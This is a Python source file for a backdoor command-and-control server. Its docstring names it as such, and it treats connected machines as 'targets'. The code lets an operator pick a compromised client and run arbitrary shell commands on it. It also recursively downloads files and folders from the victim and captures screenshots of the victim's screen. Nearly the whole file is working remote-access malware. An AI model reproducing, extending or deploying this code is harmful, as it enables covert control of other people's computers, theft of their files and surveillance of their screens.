import socket
import threading
import json
import os

from dataclasses import dataclass

from scripts.output_color import colored_error, colored_info, colored_success
from scripts.splitter import check_and_split_command
from base import PORT, DISCONNECT_MESSAGE, ENCODING
from base import run_shell_command, change_dir, send_header_and_data, recv_header_and_data


@dataclass
class Client:
    """Client object model. (targets)
    """
    addr: tuple
    sock: socket.socket
    name: str = ''


class Server:
    """Backdoor server class.

    Args:
        addr (tuple): Address of the server. (IP, PORT)
        sock (socket.socket): Socket of the server.
    """

    def __init__(self, addr: tuple, sock: socket.socket):
        self.addr = addr
        self.sock = sock
        self.clients: list = []

    def accept_clients(self) -> None:
        """Listen for incoming clients and add client to clients server list.
        """
        while True:
            try:
                client_socket, client_address = self.sock.accept()
                client = Client(addr=client_address, sock=client_socket)
                self.clients.append(client)
            except OSError:
                break

    def get_client_by_number(self, num: int):
        try:
            client = self.clients[num]
        except IndexError:
            raise IndexError(colored_error('[Client Number Error]') +
                             ' Enter a valid client number.')
        else:
            return client

    def accept_commands(self):
        """Listen for user commands.
        """
        while True:
            try:
                command = input(colored_success('╭─ ') +
                                colored_info(f'[{self.addr[0]}:{self.addr[1]}]') +
                                colored_success(f'[{len(self.clients)} Clients]') +
                                colored_success('\n╰─ ❯ '))

                try:
                    splitted_command = check_and_split_command(command)
                except IndexError as err:
                    print(err)
                    continue

                if splitted_command[0] == DISCONNECT_MESSAGE:
                    break

                if splitted_command[0] == 'cd':
                    if len(splitted_command) == 2:
                        print(change_dir(splitted_command[-1]))
                    else:
                        print(colored_error('[Argument Error]') + 'cd command need one parameter.')

                elif splitted_command[0] == 'clients':
                    if len(splitted_command) == 2 and splitted_command[1] == 'show':
                        for num, client in enumerate(self.clients):
                            print(colored_info(f'{num} - ') + f'{client.addr}')

                    elif len(splitted_command) == 3 and splitted_command[1] == 'connect':
                        try:
                            num = int(splitted_command[-1])
                        except ValueError:
                            print(colored_error('[Client Number Error]'))
                        else:
                            try:
                                client = self.get_client_by_number(num)
                            except IndexError as err:
                                print(err)
                            else:
                                self.connect_to_client(client)

                    elif len(splitted_command) == 3 and splitted_command[1] == 'disconnect':
                        try:
                            num = int(splitted_command[-1])
                        except ValueError:
                            print(colored_error('[Client Number Error]'))
                        else:
                            try:
                                client = self.get_client_by_number(num)
                            except IndexError as err:
                                print(err)
                            else:
                                self.send_command_without_output(client, DISCONNECT_MESSAGE)
                                self.clients.remove(client)

                else:
                    print(run_shell_command(command))

            except KeyboardInterrupt:
                break

        confirm = input('\nDo you want to stop the server? [y/n]: ')
        if 'y' not in confirm.lower():
            self.accept_commands()
        else:
            self.disconnect_all_clients()
            self.sock.close()
            print(colored_error('[Server down] 👻👋'))

    def connect_to_client(self, client: Client) -> None:
        """Connect to a specified client and send command to this client.

        Args:
            client (Client): client object.
        """
        while True:
            try:
                # Get client current working directory and make command prompt with.
                cwd = self.send_command(client, 'info').decode(encoding=ENCODING)
                prompt = ('╭─' + colored_info(f' {client.addr[0]}:{client.addr[1]}') +
                          f' {cwd}' + '\n╰─' + colored_info(' ❯ '))

                command = ''
                while command == '':
                    # Ask for a command to send
                    command = input(prompt)

                receive_output = True

                try:
                    splitted_command = check_and_split_command(command)
                except IndexError as err:
                    print(err)
                    continue

                if splitted_command[0] == DISCONNECT_MESSAGE:
                    break

                if splitted_command[0] == 'bg':
                    receive_output = False
                    splitted_command = splitted_command[1:]

                if splitted_command[0] == 'download':
                    if len(splitted_command) == 3:
                        self.download(client, splitted_command[-2], splitted_command[-1])
                    elif len(splitted_command) == 2:
                        self.download(client, splitted_command[-1], splitted_command[-1])
                    elif len(splitted_command) < 2:
                        print(colored_error('[Parameter Error]') +
                              'download command need one or two arguments.')
                    else:
                        print(colored_error('[Parameter Error]') +
                              'download command accept two arguments maximum.')

                elif splitted_command[0] == 'capture':
                    if len(splitted_command) == 2:
                        self.screenshot(client, splitted_command[1])
                    else:
                        print(colored_error('[Parameter Error]') +
                              'capture command need one argument.')

                else:
                    if receive_output:
                        output = self.send_command(client, command).decode(encoding=ENCODING)
                        print(output)
                    else:
                        self.send_command_without_output(client, command)

            except KeyboardInterrupt:
                continue

    def disconnect_all_clients(self) -> None:
        """Disconnect all clients connected to the server.
        """
        for client in self.clients:
            send_header_and_data(client.sock, DISCONNECT_MESSAGE.encode(encoding=ENCODING))

    @staticmethod
    def send_command(client: Client, command: str, *args, show_progress=False) -> bytes:
        """Send command with arguments to specified client socket.

        Args:
            client (str): client that will receive the command.
            command (str): command to send.
            *args (tuple, optional): command parameters.
            show_progress (bool, optional): Show progressbar if True. Defaults to False.

        Returns:
            bytes: output of command
        """
        desc = None
        if command == 'download':
            file_name = args[-1].split("/")[-1].split("\\")[-1]
            desc = f'Receiving {file_name}'
        final_command = " ".join([command] + list(args))
        send_header_and_data(client.sock, final_command.encode(encoding=ENCODING))
        return recv_header_and_data(client.sock, desc=desc, show_progress=show_progress)

    @staticmethod
    def send_command_without_output(client: Client, command: str, *args) -> None:
        """Send command to the specified client but doesn't wait for output.

        Args:
            client (str): client that will receive the command.
            command (str): command to send.
            *args (tuple, optional): command parameters.
        """
        final_command = " ".join([command] + list(args))
        send_header_and_data(client.sock, final_command.encode(encoding=ENCODING))

    def check_path_type(self, client: Client, path: str) -> str:
        """Check if the path on client is a directory or a file.

        Args:
            client (Client): client object.
            path (str): path to check on client.

        Returns:
            str: 'directory' or 'file'.
        """
        return self.send_command(client, 'path-type', f'"{path}"').decode(encoding=ENCODING)

    def check_path_exists(self, client: Client, path: str) -> bool:
        """Check if the path exists on client.

        Args:
            client (Client): client object.
            path (str): path to check on client.

        Returns:
            bool: True if exist else False.
        """
        result = self.send_command(client, 'path-exists', f'"{path}"').decode(encoding=ENCODING)
        return json.loads(result)

    def check_path_permission(self, client: Client, path: str) -> bool:
        """Check if the client has permission to read path.

        Args:
            client (Client): client object.
            path (str): path to check on client.

        Returns:
            bool: True if the client has permission else False.
        """
        result = self.send_command(client, 'has-permission', f'"{path}"').decode(encoding=ENCODING)
        return json.loads(result)

    def list_dir_content(self, client: Client, path: str) -> list:
        """List the content of directory on client path.

        Args:
            client (Client): client object.
            path (str): path of directory.

        Returns:
            list: list of all contents
        """
        result = self.send_command(client, 'list-content', f'"{path}"').decode(encoding=ENCODING)
        return json.loads(result)

    def download_file(self, client: Client, path: str, destination: str) -> None:
        """Download file from client to server machine.

        Args:
            client (Client): client object.
            path (str): file path on server.
            destination (str): server destination path.
        """
        print('Download ' + colored_info(path))
        output = self.send_command(client, 'download', f'"{path}"', show_progress=True)

        # Write file to the destination.
        with open(destination, 'wb') as f:
            f.write(output)

    def download(self, client: Client, path: str, destination: str) -> None:
        """Download file or folder on client.

        Args:
            client (Client): client object.
            path (str): path of file or folder.
            destination (str): client destination path.
        """
        # Check that the given path exists on client machine.
        if self.check_path_exists(client, path):

            if os.path.exists(destination):
                # Check if destination already exist on server machine.
                # Ask for new destination if already exists.
                print(colored_error('[Duplicated file error]'
                                    f' Destination "{destination}" already exists.'))
                new_destination = input('New destination: ' + colored_info(': '))
                return self.download(client, path, new_destination)

            if self.check_path_permission(client, path):
                # Check if path on client is directory or file.
                path_type = self.check_path_type(client, path)

                if path_type == 'file':
                    # Download the file if path type is file.
                    self.download_file(client, path, destination)

                elif path_type == 'directory':
                    # If directory, create folder on server machine, get content of directory
                    # and download each file and directory inside the directory.
                    os.mkdir(destination)
                    os.chdir(destination)
                    dir_contents = self.list_dir_content(client, path)
                    print('\n' + colored_success('Start Downloading ') + colored_info(path) + 'directory.\n')
                    for file in dir_contents:
                        file_path = os.path.join(path, file)
                        self.download(client, file_path, file)
                    os.chdir('..')
                    print('\n' + colored_success('Finish Downloading ') + colored_info(path) + 'directory.\n')

            else:
                print(colored_error(f'[Permission Error] for path "{path}".'))

        else:
            print(colored_error(f"[File Not Found Error] {path} doesn't exists."))

    def screenshot(self, client, destination: str) -> None:
        """Receive a client screenshot.

        Args:
            client (Client): client object.
            destination (str): destination path.
        """
        output = self.send_command(client, 'capture', show_progress=True)

        if output == 'screenshot-error'.encode(encoding=ENCODING):
            # Error for screenshot command
            print(colored_error("[Screenshot Error]") + "Can't take a screenshot.")

        else:
            # Write the binary file on server machine
            with open(destination, 'wb') as f:
                f.write(output)

    def run(self) -> None:
        """Run the server.
        """
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, socket.SOCK_STREAM)
        self.sock.bind(self.addr)
        self.sock.listen()

        print(colored_success('\n[Server start]') + ' at ' +
              colored_info(f'[{self.addr[0]}:{self.addr[1]}]') + ' 📡\n')

        thread = threading.Thread(target=self.accept_clients)
        thread.start()

        self.accept_commands()


if __name__ == '__main__':
    while True:
        ip_list = socket.getaddrinfo(socket.gethostname(), PORT, family=socket.AF_INET)
        print(colored_info('[IP List]') + ' List of IP address\n')
        for i, ip in enumerate(ip_list):
            print(colored_info(f'{i + 1}') + f' - {ip[-1]}')

        print('\nIn which address would you like to run the server?')

        try:
            server_index = int(input(colored_info('[IP Choice]: ')))
            server_address = ip_list[server_index - 1][-1]
        except (ValueError, IndexError):
            print(colored_error('\n[Choice Error] ' +
                                f'Chose between {[i + 1 for i in range(len(ip_list))]}'))
        except KeyboardInterrupt:
            print(colored_error('Exit'))
            break
        else:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server = Server(server_address, server_socket)
            server.run()
            break
